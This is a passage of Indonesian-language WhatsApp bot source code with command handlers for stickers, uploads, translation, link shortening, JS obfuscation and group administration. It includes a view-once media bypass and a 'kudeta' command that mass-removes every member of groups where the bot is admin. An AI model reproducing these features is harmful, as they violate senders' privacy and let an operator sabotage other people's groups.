    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "/*Ochobot/*^/*($break)*/" + 
            "/*Ochobot/*^/*($break)*/";

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },

    stack: false,
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await conn.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
await fs.unlinkSync(`./@hardenc${filename}.js`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "shortlink-dl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await conn.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
m.reply(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = `\n *乂 List all group chat*\n`
let a = await conn.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cekidch": case "idch": {
  if (!text) return m.reply(example("linkchnya"));
  if (!text.includes("https://whatsapp.com/channel/")) return m.reply("❌ Link tautan tidak valid");

  try {
    let result = text.split('https://whatsapp.com/channel/')[1];
    let res = await conn.newsletterMetadata("invite", result);

    let teks = `
*✅ Data Channel Berhasil Didapatkan*

🆔 ID: ${res.id}
👥 Nama: ${res.name}
📊 Total Pengikut: ${res.subscribers}
📌 Status: ${res.state}
✔️ Verified: ${res.verification == "VERIFIED" ? "Terverifikasi ✅" : "Tidak ❌"}
`.trim();

    // Generate pesan nativeFlowMessage dengan button salin
    let msg = await generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          interactiveMessage: proto.Message.InteractiveMessage.create({
            body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [
                {
                  name: "cta_copy",
                  buttonType: 7,
                  buttonParamsJson: JSON.stringify({
                    display_text: "📋 Copy ID",
                    copy_code: res.id
                  })
                },
                {
                  name: "cta_copy",
                  buttonType: 7,
                  buttonParamsJson: JSON.stringify({
                    display_text: "👥 Copy Nama",
                    copy_code: res.name
                  })
                },
                {
                  name: "cta_copy",
                  buttonType: 7,
                  buttonParamsJson: JSON.stringify({
                    display_text: "📊 Copy Pengikut",
                    copy_code: res.subscribers.toString()
                  })
                }
              ]
            })
          })
        }
      }
    }, { userJid: m.chat, quoted: m });

    // Kirim hanya 1x
    await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

  } catch (e) {
    console.error(e);
    m.reply("❌ Gagal mengambil data channel.");
  }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "brat": {
 let cmd = "brat";

 if (!text) return m.reply(`Example: *${cmd} teksnya*`);

 const axios = require("axios");

 try {
 // Kirim reaction loading dulu (opsional)
 await conn.sendMessage(m.chat, {
 react: { text: "⏱️", key: m.key }
 });

 const url = `https://api.hanggts.xyz/imagecreator/brat?text=${encodeURIComponent(text)}`;
 const response = await axios.get(url, { responseType: "arraybuffer" });
 const buffer = response.data;

 // Kirim langsung sebagai sticker tanpa konversi tambahan
 await conn.sendAsSticker(m.chat, buffer, m, {
 packname: global.packname || "Marceleven-V5",
 author: global.author || "Marceleven",
 });

 // Tambah exp user
 if (db.users && db.users[m.sender]) {
 db.users[m.sender].exp = (db.users[m.sender].exp || 0) + 300;
 }
 } catch (e) {
 console.error("Gagal kirim sticker brat:", e);
 m.reply("Gagal mengirim sticker.");
 }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await conn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await conn.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "rvo":
case "readviewonce": {
    if (!isCreator) return m.reply("❌ Fitur ini hanya bisa digunakan oleh Owner bot!");

    if (!m.quoted) return m.reply(example("dengan reply pesannya"))
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")

    let media = await downloadContentFromMessage(
        msg[type],
        type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio'
    )

    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }

    if (/video/.test(type)) {
        return conn.sendMessage(m.chat, {
            video: buffer,
            caption: msg[type].caption || ""
        }, {quoted: m})
    } else if (/image/.test(type)) {
        return conn.sendMessage(m.chat, {
            image: buffer,
            caption: msg[type].caption || ""
        }, {quoted: m})
    } else if (/audio/.test(type)) {
        return conn.sendMessage(m.chat, {
            audio: buffer,
            mimetype: "audio/mpeg",
            ptt: true
        }, {quoted: m})
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tourl": {
    if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
    let media = await conn.downloadAndSaveMediaMessage(qmsg)
    const { ImageUploadService } = require('node-upload-images')
    const service = new ImageUploadService('pixhost.to');
    let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'Marceleven.png');
    
    let teks = `${directLink.toString()}\n\nTekan tombol di bawah untuk menyalin URL:`;
    
    // Generate pesan dengan button
    const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
    const proto = require('@whiskeysockets/baileys').proto;
    
    let msg = await generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "cta_copy",
                                buttonType: 7,
                                buttonParamsJson: JSON.stringify({
                                    display_text: "📋 Salin URL",
                                    copy_code: directLink.toString()
                                })
                            }
                        ]
                    })
                })
            }
        }
    }, { userJid: m.chat, quoted: m });
    
    // Kirim pesan dengan button
    await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
    await fs.unlinkSync(media)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tourl2": {
    if (!m.quoted && !m.hasMedia) return m.reply(`*Contoh penggunaan :*\nKirim file (foto/video/audio/dokumen) atau reply file dengan ketik ${cmd}`);

    const FormData = require('form-data');
    const { fromBuffer } = require('file-type');
    const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
    const proto = require('@whiskeysockets/baileys').proto;
    
    async function uploadToCatbox(buffer) {
        try {
            const fetchModule = await import('node-fetch');
            const fetch = fetchModule.default;
            
            // Dapatkan ekstensi file
            let fileTypeResult = await fromBuffer(buffer);
            let ext = fileTypeResult ? fileTypeResult.ext : "bin";
            
            let bodyForm = new FormData();
            bodyForm.append("fileToUpload", buffer, `file.${ext}`);
            bodyForm.append("reqtype", "fileupload");
            
            let res = await fetch("https://catbox.moe/user/api.php", {
                method: "POST",
                body: bodyForm,
            });
            
            let data = await res.text();
            
            // Validasi response
            if (!data || data.includes("<!DOCTYPE html>") || data.includes("Error")) {
                throw new Error("Upload gagal: " + data);
            }
            
            return data;
        } catch (error) {
            console.error("Upload error:", error);
            throw error;
        }
    }

    try {
        let mediaBuffer;
        
        // Cek apakah ini adalah quoted message atau pesan langsung
        if (m.quoted) {
            // Cek apakah quoted message memiliki media
            // Perbaikan: cek property yang benar
            const quotedMsg = m.quoted;
            const hasMedia = quotedMsg.hasMedia || 
                            quotedMsg.type === 'imageMessage' || 
                            quotedMsg.type === 'videoMessage' || 
                            quotedMsg.type === 'audioMessage' || 
                            quotedMsg.type === 'documentMessage';
            
            if (!hasMedia) {
                return m.reply("Pesan yang direply bukan file media!");
            }
            
            try {
                mediaBuffer = await m.quoted.download();
            } catch (error) {
                return m.reply("Gagal mendownload file dari pesan yang direply. File mungkin sudah kadaluarsa atau tidak tersedia.");
            }
        } else {
            // Cek apakah pesan langsung memiliki media
            // Perbaikan: cek property yang benar
            const hasMedia = m.hasMedia || 
                            m.type === 'imageMessage' || 
                            m.type === 'videoMessage' || 
                            m.type === 'audioMessage' || 
                            m.type === 'documentMessage';
            
            if (!hasMedia) {
                return m.reply("Pesan harus berisi file media!");
            }
            
            try {
                mediaBuffer = await m.download();
            } catch (error) {
                return m.reply("Gagal mendownload file. Coba kirim ulang file tersebut.");
            }
        }

        // Validasi buffer
        if (!mediaBuffer || mediaBuffer.length === 0) {
            return m.reply("File kosong atau tidak valid!");
        }

        // Upload ke Catbox
        await m.reply("⏳ Mengunggah file...");
        let fileUrl = await uploadToCatbox(mediaBuffer);
        
        // Ambil mime type untuk menentukan jenis pesan
        const mime = m.quoted ? (m.quoted.mimetype || '') : (m.mimetype || '');
        
        // Tentukan jenis file untuk caption
        let fileType = "File";
        let emoji = "📄";
        
        if (mime) {
            if (mime.startsWith('image/')) {
                fileType = "Gambar";
                emoji = "📸";
            } else if (mime.startsWith('video/')) {
                fileType = "Video";
                emoji = "🎬";
            } else if (mime.startsWith('audio/')) {
                fileType = "Audio";
                emoji = "🎵";
            }
        }

        // Buat teks untuk pesan
        let teks = `${emoji} *${fileType} Berhasil Diunggah!*\n\n🔗 *URL:* ${fileUrl}\n\nTekan tombol di bawah untuk menyalin URL:`;

        // Generate pesan dengan button (hanya 1 tombol untuk salin URL)
        let msg = await generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    name: "cta_copy",
                                    buttonType: 7,
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "📋 Salin URL",
                                        copy_code: fileUrl
                                    })
                                }
                            ]
                        })
                    })
                }
            }
        }, { userJid: m.chat, quoted: m });

        // Kirim pesan dengan button
        await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

    } catch (error) {
        console.error("tourl2 error:", error);
        await m.reply(`❌ Gagal mengunggah file: ${error.message || "Unknown error"}`);
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "add": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await conn.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await conn.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await conn.groupLeave(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await conn.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await conn.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await conn.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await conn.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "h":
case "ht":
case "hidetag": {
  if (!m.isGroup) return Reply(mess.group)
  if (!isCreator && !m.isAdmin) return Reply("❌ Fitur ini hanya bisa digunakan oleh owner yang merupakan admin grup atau nomor bot.");

  if (!text) return m.reply(example("pesannya"))

  try {
    // Ambil metadata grup
    const groupMetadata = await conn.groupMetadata(m.chat);

    let member = groupMetadata.participants.map(v => v.id)
    await conn.sendMessage(m.chat, {
      text: text,
      mentions: member
    }, { quoted: m })
  } catch (error) {
    console.error("Error saat mengambil metadata grup:", error);
    return Reply("❌ Terjadi kesalahan saat mengambil metadata grup.");
  }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joingrup":
case "join": {
  if (!isCreator) return Reply(mess.owner)
  if (!text) return m.reply(example("linkgcnya"))
  if (!text.includes("chat.whatsapp.com")) return m.reply("❌ Link grup tidak valid!")

  try {
    let code = text.split('https://chat.whatsapp.com/')[1]
    let groupId = await conn.groupAcceptInvite(code)

    // Ambil data grup setelah bergabung
    let metadata = await conn.groupMetadata(groupId)
    let groupName = metadata.subject
    let totalMember = metadata.participants.length

    m.reply(`✅ Berhasil bergabung ke grup *${groupName}*\n👥 Total Member: *${totalMember}*\n🆔 ID Grup: *${groupId}*`)
  } catch (e) {
    console.error(e)
    m.reply("❌ Gagal join grup, mungkin link sudah tidak aktif atau bot diblokir.")
  }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "get": case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
await conn.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoread": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autoread == true) return m.reply(`*Autoread* sudah aktif!`)
global.db.settings.autoread = true
return m.reply("Berhasil menyalakan *autoread*")
} else if (teks == "off") {
if (global.db.settings.autoread == false) return m.reply(`*Autoread* tidak aktif!`)
global.db.settings.autoread = false
return m.reply("Berhasil mematikan *autoread*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autopromosi": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autopromosi == true) return m.reply(`*Autopromosi* sudah aktif!`)
global.db.settings.autopromosi = true
return m.reply("Berhasil menyalakan *autopromosi*")
} else if (teks == "off") {
if (global.db.settings.autopromosi == false) return m.reply(`*Autopromosi* tidak aktif!`)
global.db.settings.autopromosi = false
return m.reply("Berhasil mematikan *autopromosi*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autotyping": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autotyping == true) return m.reply(`*Autotyping* sudah aktif!`)
global.db.settings.autotyping = true
return m.reply("Berhasil menyalakan *autotyping*")
} else if (teks == "off") {
if (global.db.settings.autotyping == false) return m.reply(`*Autotyping* tidak aktif!`)
global.db.settings.autotyping = false
return m.reply("Berhasil mematikan *autotyping*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoreadsw": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.readsw == true) return m.reply(`*Autoreadsw* sudah aktif!`)
global.db.settings.readsw = true
return m.reply("Berhasil menyalakan *autoreadsw*")
} else if (teks == "off") {
if (global.db.settings.readsw == false) return m.reply(`*Autoreadsw* tidak aktif!`)
global.db.settings.readsw = false
return m.reply("Berhasil mematikan *autoreadsw*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "welcome": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return m.reply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return m.reply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return m.reply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return m.reply("Berhasil mematikan *welcome* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "setwelcome": {
  if (!isCreator) return Reply("❌ Hanya owner yang dapat mengatur welcome.");
  if (!m.isGroup) return Reply("❌ Fitur ini hanya bisa digunakan di dalam grup.");

  const chat = m.chat;

  // Pastikan data grup ada
  if (!global.db.groups[chat]) global.db.groups[chat] = {};
  if (!global.db.groups[chat].welcomeMsg) global.db.groups[chat].welcomeMsg = null;
  if (!global.db.groups[chat].welcome == undefined) global.db.groups[chat].welcome = false;

  if (!text) {
    return Reply(`
❗ *Cara pakai setwelcome:*

Ketik:
${cmd}setwelcome Selamat datang @user di @subject! Kamu adalah member ke @count 🎉

Variable tersedia:
@user  = Tag orang yang masuk
@subject = Nama grup
@count = Jumlah member
`);
  }

  // Simpan pesan custom
  global.db.groups[chat].welcomeMsg = text;

  Reply(`✅ *Pesan welcome berhasil disimpan!*

Gunakan:
→ ${cmd}togglewelcome
untuk mengaktifkan / menonaktifkan welcome.`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "setgoodbye": {
    if (!isCreator) return Reply("❌ Hanya owner yang dapat mengatur goodbye.");
    if (!m.isGroup) return Reply("❌ Fitur ini hanya bisa digunakan di dalam grup.");

    const chat = m.chat;

    // Pastikan data grup ada
    if (!global.db.groups[chat]) global.db.groups[chat] = {};
    if (!global.db.groups[chat].goodbyeMsg) global.db.groups[chat].goodbyeMsg = null;
    if (global.db.groups[chat].welcome == undefined) global.db.groups[chat].welcome = false;

    if (!text) {
      return Reply(`
❗ *Cara pakai setgoodbye:*

Ketik:
${cmd}setgoodbye @user telah left dari @subject. Member tersisa @count 😢

Variable tersedia:
@user  = Tag orang
@subject = Nama grup
@count = Jumlah member
`);
    }

    global.db.groups[chat].goodbyeMsg = text;

    Reply(`✅ *Pesan goodbye berhasil disimpan!*\n\nGunakan:\n→ ${cmd}togglegoodbye\nuntuk mengaktifkan / menonaktifkan goodbye.`);
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "mute": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return m.reply(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return m.reply("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return m.reply(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return m.reply("Berhasil mematikan *mute* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await conn.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await conn.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "kudetagc": {
    if (!isCreator) return Reply(mess.owner);

    let page = parseInt(text) || 1;
    const perPage = 3;

    let allChats = await conn.groupFetchAllParticipating();
    let groups = Object.entries(allChats)
        .map(([jid, data]) => ({
            id: jid,
            name: data.subject || 'Tanpa Nama',
            isBotAdmin: data.participants.some(p => p.id === botNumber && p.admin === "admin")
        }))
        .filter(g => g.isBotAdmin);

    if (!groups.length) return Reply("❌ Bot tidak jadi admin di grup manapun.");

    let totalPages = Math.ceil(groups.length / perPage);
    if (page < 1 || page > totalPages) page = 1;

    let start = (page - 1) * perPage;
    let currentGroups = groups.slice(start, start + perPage);

    global.cacheGrupKudeta = {};

    let teks = `*📌 Pilih Grup untuk di-Kudeta (Halaman ${page}/${totalPages}):*\n\n`;
    let buttons = [];

    currentGroups.forEach((g, i) => {
        const key = `kudeta_${start + i}`;
        global.cacheGrupKudeta[key] = g.id;
        teks += `• ${start + i + 1}. *${g.name}*\n  📎 ID: ${g.id}\n\n`;
        buttons.push({
            buttonId: `.kudetagrp ${key}`,
            buttonText: { displayText: `Kudeta ${start + i + 1}` },
            type: 1
        });
    });

    if (totalPages > 1) {
        if (page > 1) {
            buttons.push({
                buttonId: `.kudetagc ${page - 1}`,
                buttonText: { displayText: '⬅️ Prev' },
                type: 1
            });
        }
        if (page < totalPages) {
            buttons.push({
                buttonId: `.kudetagc ${page + 1}`,
                buttonText: { displayText: '➡️ Next' },
                type: 1
            });
        }
    }

    await conn.sendMessage(m.chat, {
        text: teks.trim(),
        footer: `© ${botname} 2025`,
        buttons: buttons,
        headerType: 1
    }, { quoted: m });
}
break;

case "kudetagrp": {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return Reply("❌ Pilihan tidak ditemukan.")

    let grupId = global.cacheGrupKudeta?.[text.trim()]
    if (!grupId) return Reply("❌ Grup tidak valid atau cache sudah hilang.")

    let metadata = await conn.groupMetadata(grupId)
    let memberFilter = metadata.participants
        .map(v => v.id)
        .filter(e => e !== botNumber && e !== m.sender)

    if (!memberFilter.length) return Reply("✅ Grup sudah tidak ada member lain!")

    await Reply(`🔥 Kudeta Grup *${metadata.subject}* By Marceleven Dimulai...`)
    for (let i of memberFilter) {
        await conn.groupParticipantsUpdate(grupId, [i], 'remove')
        await sleep(1000)
    }
    await Reply(`🏴Marceleven☠️ Kudeta Grup *${metadata.subject}* selesai!`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await conn.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await conn.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cadmin": {
  if (!isCreator) return Reply(mess.owner);
  if (!text) return Reply(example("nama,@tag"));

